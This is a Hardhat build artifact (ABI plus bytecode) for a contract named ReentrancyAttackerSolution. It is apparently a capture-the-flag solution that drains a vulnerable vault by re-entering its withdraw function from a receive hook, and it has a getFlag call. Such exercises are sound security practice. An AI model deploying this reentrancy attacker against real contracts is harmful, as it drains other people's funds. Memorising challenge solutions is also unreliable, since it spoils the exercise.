{
  "_format": "hh-sol-artifact-1",
  "contractName": "ReentrancyAttackerSolution",
  "sourceName": "contracts/ReentrancyAttackerSolution.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vaultAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getFlag",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vault",
      "outputs": [
        {
          "internalType": "contract IVault",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60a06040526000600160006101000a81548160ff02191690831515021790555034801561002b57600080fd5b50604051610c64380380610c64833981810160405281019061004d91906100ea565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff168152505050610117565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100b78261008c565b9050919050565b6100c7816100ac565b81146100d257600080fd5b50565b6000815190506100e4816100be565b92915050565b600060208284031215610100576100ff610087565b5b600061010e848285016100d5565b91505092915050565b608051610b0961015b6000396000818160540152818161018601528181610221015281816102a101528181610420015281816104ee01526105870152610b096000f3fe6080604052600436106100385760003560e01c80639e5faafc146100da578063f9633930146100e4578063fbfa77cf1461010f576100d5565b366100d557600160009054906101000a900460ff16156100d3577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100ba57600080fd5b505af11580156100ce573d6000803e3d6000fd5b505050505b005b600080fd5b6100e261013a565b005b3480156100f057600080fd5b506100f961041c565b6040516101069190610639565b60405180910390f35b34801561011b57600080fd5b50610124610585565b60405161013191906106da565b60405180910390f35b6000341161017d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161017490610741565b60405180910390fd5b476000819055507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101ec57600080fd5b505af1158015610200573d6000803e3d6000fd5b505050505060018060006101000a81548160ff0219169083151502179055507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561028757600080fd5b505af115801561029b573d6000803e3d6000fd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663b68246036040518163ffffffff1660e01b8152600401602060405180830381865afa15801561030a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061032e91906107ad565b61036d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161036490610826565b60405180910390fd5b60003373ffffffffffffffffffffffffffffffffffffffff164760405161039390610877565b60006040518083038185875af1925050503d80600081146103d0576040519150601f19603f3d011682016040523d82523d6000602084013e6103d5565b606091505b5050905080610419576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610410906108d8565b60405180910390fd5b50565b60607f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663b68246036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610489573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104ad91906107ad565b6104ec576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104e390610944565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f96339306040518163ffffffff1660e01b8152600401600060405180830381865afa158015610557573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906105809190610a8a565b905090565b7f000000000000000000000000000000000000000000000000000000000000000081565b600081519050919050565b600082825260208201905092915050565b60005b838110156105e35780820151818401526020810190506105c8565b60008484015250505050565b6000601f19601f8301169050919050565b600061060b826105a9565b61061581856105b4565b93506106258185602086016105c5565b61062e816105ef565b840191505092915050565b600060208201905081810360008301526106538184610600565b905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006106a061069b6106968461065b565b61067b565b61065b565b9050919050565b60006106b282610685565b9050919050565b60006106c4826106a7565b9050919050565b6106d4816106b9565b82525050565b60006020820190506106ef60008301846106cb565b92915050565b7f53656e642045544820746f20706572666f726d207468652061747461636b0000600082015250565b600061072b601e836105b4565b9150610736826106f5565b602082019050919050565b6000602082019050818103600083015261075a8161071e565b9050919050565b6000604051905090565b600080fd5b600080fd5b60008115159050919050565b61078a81610775565b811461079557600080fd5b50565b6000815190506107a781610781565b92915050565b6000602082840312156107c3576107c261076b565b5b60006107d184828501610798565b91505092915050565b7f4661696c656420746f20647261696e20746865207661756c7400000000000000600082015250565b60006108106019836105b4565b915061081b826107da565b602082019050919050565b6000602082019050818103600083015261083f81610803565b9050919050565b600081905092915050565b50565b6000610861600083610846565b915061086c82610851565b600082019050919050565b600061088282610854565b9150819050919050565b7f4661696c656420746f2072657475726e2066756e647300000000000000000000600082015250565b60006108c26016836105b4565b91506108cd8261088c565b602082019050919050565b600060208201905081810360008301526108f1816108b5565b9050919050565b7f5661756c74206e6f7420647261696e6564207965740000000000000000000000600082015250565b600061092e6015836105b4565b9150610939826108f8565b602082019050919050565b6000602082019050818103600083015261095d81610921565b9050919050565b600080fd5b600080fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6109a6826105ef565b810181811067ffffffffffffffff821117156109c5576109c461096e565b5b80604052505050565b60006109d8610761565b90506109e4828261099d565b919050565b600067ffffffffffffffff821115610a0457610a0361096e565b5b610a0d826105ef565b9050602081019050919050565b6000610a2d610a28846109e9565b6109ce565b905082815260208101848484011115610a4957610a48610969565b5b610a548482856105c5565b509392505050565b600082601f830112610a7157610a70610964565b5b8151610a81848260208601610a1a565b91505092915050565b600060208284031215610aa057610a9f61076b565b5b600082015167ffffffffffffffff811115610abe57610abd610770565b5b610aca84828501610a5c565b9150509291505056fea26469706673582212207811dace6497799a27cb32cb4935c9083cbaf757aad2d9c22c542259853edfc064736f6c63430008140033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}